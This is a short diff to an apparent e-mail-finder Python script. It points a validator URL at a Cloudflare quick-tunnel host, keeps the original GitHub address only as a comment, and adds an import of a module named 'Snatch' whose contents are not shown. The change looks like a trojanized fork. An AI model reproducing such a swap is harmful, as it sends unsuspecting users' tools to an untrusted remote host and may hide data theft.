@@ -1,8 +1,8 @@
 import os, sys, time, json, requests, subprocess
 import src.lib.colors as cl
+from src.utils.snatch import Snatch
 from requests.exceptions import Timeout
-from .....utils.basics import cls, terminal
-
+from src.utils.basics import cls, terminal
 
 
 validator_url = "https://ftp-mj-washer-maritime.trycloudflare.com/" # https://raw.githubusercontent.com/mishakorzik/MailFinder/main/.validator
@@ -16,7 +16,6 @@ def banner():
     print(f'\n{cl.des_space}{cl.b}>> {cl.w}To find the username you need, write your last name and \n{cl.des_space}{cl.b}>> {cl.w}first name in different ways. For example: vuiko, vuikoo, vu\n{cl.des_space}{cl.b}>> {cl.w}It still takes a long time to find your e-mail.\n')
 
 def restart(*args):
-    terminal("iom")
     banner()
     selecttype(*args)
 
